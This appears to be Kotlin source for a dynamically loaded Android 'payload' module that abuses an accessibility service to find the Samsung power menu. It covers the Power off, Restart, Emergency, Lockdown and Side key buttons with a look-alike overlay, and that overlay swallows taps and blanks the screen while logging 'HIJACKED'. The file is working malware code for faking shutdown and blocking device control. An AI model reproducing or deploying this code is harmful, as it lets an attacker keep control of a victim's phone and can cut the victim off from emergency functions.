package com.speedster.payload

import android.content.Context
import android.graphics.BitmapFactory
import android.graphics.Rect
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.Text
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Button
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.platform.LocalDensity
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.speedster.DynamicEntry
import java.io.File

class PayloadEntry : DynamicEntry {
    private val stickerBounds = mutableStateMapOf<String, Rect>()
    private var isHijackActive by mutableStateOf(false)

    override @Composable fun Render(context: Context, resDir: File) {
        val density = LocalDensity.current
        val clipboardManager = LocalClipboardManager.current

        // Cache images to avoid reloading every frame
        val images = remember(resDir) {
            mapOf(
                "Power off" to loadBitmap(resDir, "power.png"),
                "Restart" to loadBitmap(resDir, "restart.png"),
                "Emergency mode" to loadBitmap(resDir, "emergency.png"),
                "Lockdown mode" to loadBitmap(resDir, "lockdown.png"),
                "Side key settings" to loadBitmap(resDir, "sidekey.png")
            )
        }

        LaunchedEffect(Unit) {
            DynamicEntry.log("📡 Brain Online. Hijack Ready.")
            
            DynamicEntry.accessibilityInterceptor = { event ->
                if (event.packageName == "com.android.systemui") {
                    val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                    root?.let { 
                        updateStickerMap(it)
                        val foundAny = stickerBounds.isNotEmpty()
                        if (foundAny != isHijackActive) {
                            isHijackActive = foundAny
                            DynamicEntry.log(if (foundAny) "🎯 TARGET LOCKED" else "📉 TARGET LOST")
                            DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
                                flags = if (foundAny) 
                                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                    else android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                            )
                        }
                    }
                } else if (isHijackActive) {
                    isHijackActive = false
                    stickerBounds.clear()
                    DynamicEntry.overlayContent = null
                }
            }
        }

        // --- MAIN APP UI ---
        Column(modifier = Modifier.fillMaxSize().background(Color.Black).padding(16.dp)) {
            Text("GHOST CONSOLE", color = Color.Green, fontSize = 18.sp)
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
                Button(onClick = { DynamicEntry.systemLogs.clear() }) { Text("Clear") }
                Button(onClick = { 
                    val allLogs = DynamicEntry.systemLogs.joinToString("\n")
                    clipboardManager.setText(AnnotatedString(allLogs))
                }) { Text("Copy") }
            }
            LazyColumn(modifier = Modifier.weight(1f).fillMaxWidth()) {
                items(DynamicEntry.systemLogs.asReversed()) { log ->
                    Text(log, color = Color(0xFF00FF00), fontSize = 11.sp, fontFamily = FontFamily.Monospace)
                    HorizontalDivider(color = Color.DarkGray)
                }
            }
        }

        // --- HIJACK OVERLAY ---
        SideEffect {
            if (isHijackActive) {
                DynamicEntry.overlayContent = { 
                    Box(modifier = Modifier.fillMaxSize()) {
                        stickerBounds.forEach { (name, rect) ->
                            val bitmap = images[name]
                            Box(
                                modifier = Modifier
                                    .offset(x = with(density) { rect.left.toDp() }, y = with(density) { rect.top.toDp() })
                                    .size(width = with(density) { (rect.right - rect.left).toDp() }, height = with(density) { (rect.bottom - rect.top).toDp() })
                                    .clickable { 
                                        DynamicEntry.log("⚡ HIJACKED: $name")
                                        DynamicEntry.overlayContent = { Box(modifier = Modifier.fillMaxSize().background(Color.Black)) } 
                                    }
                            ) {
                                if (bitmap != null) {
                                    Image(bitmap = bitmap, contentDescription = null, modifier = Modifier.fillMaxSize())
                                } else {
                                    Box(modifier = Modifier.fillMaxSize().background(Color.Red.copy(0.3f))) 
                                }
                            }
                        }
                    }
                }
            } else {
                DynamicEntry.overlayContent = null
            }
        }
    }

    private fun updateStickerMap(node: AccessibilityNodeInfo) {
        val foundThisPass = mutableSetOf<String>()
        crawl(node, foundThisPass)
        val toRemove = stickerBounds.keys.filter { it !in foundThisPass }
        toRemove.forEach { stickerBounds.remove(it) }
    }

    private fun crawl(node: AccessibilityNodeInfo?, found: MutableSet<String>) {
        if (node == null) return
        val id = node.viewIdResourceName ?: ""
        if (id.contains("sec_global_actions_icon_label_view") || id.contains("sec_global_actions_key_settings")) {
            val stickerName = determineStickerName(node, id)
            if (stickerName != null) {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                stickerBounds[stickerName] = rect
                found.add(stickerName)
            }
        }
        for (i in 0 until node.childCount) {
            crawl(node.getChild(i), found)
        }
    }

    private fun determineStickerName(node: AccessibilityNodeInfo, id: String): String? {
        if (id.contains("key_settings")) return "Side key settings"
        val text = findTextRecursive(node)
        return when {
            text.contains("Power off", true) -> "Power off"
            text.contains("Restart", true) -> "Restart"
            text.contains("Emergency", true) -> "Emergency mode"
            text.contains("Lockdown", true) -> "Lockdown mode"
            else -> null
        }
    }

    private fun findTextRecursive(node: AccessibilityNodeInfo): String {
        val t = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
        if (t.isNotBlank()) return t
        for (i in 0 until node.childCount) {
            val found = findTextRecursive(node.getChild(i) ?: continue)
            if (found.isNotBlank()) return found
        }
        return ""
    }

    private fun loadBitmap(resDir: File, name: String) = try {
        BitmapFactory.decodeFile(File(resDir, name).absolutePath).asImageBitmap()
    } catch (e: Exception) { null }
}
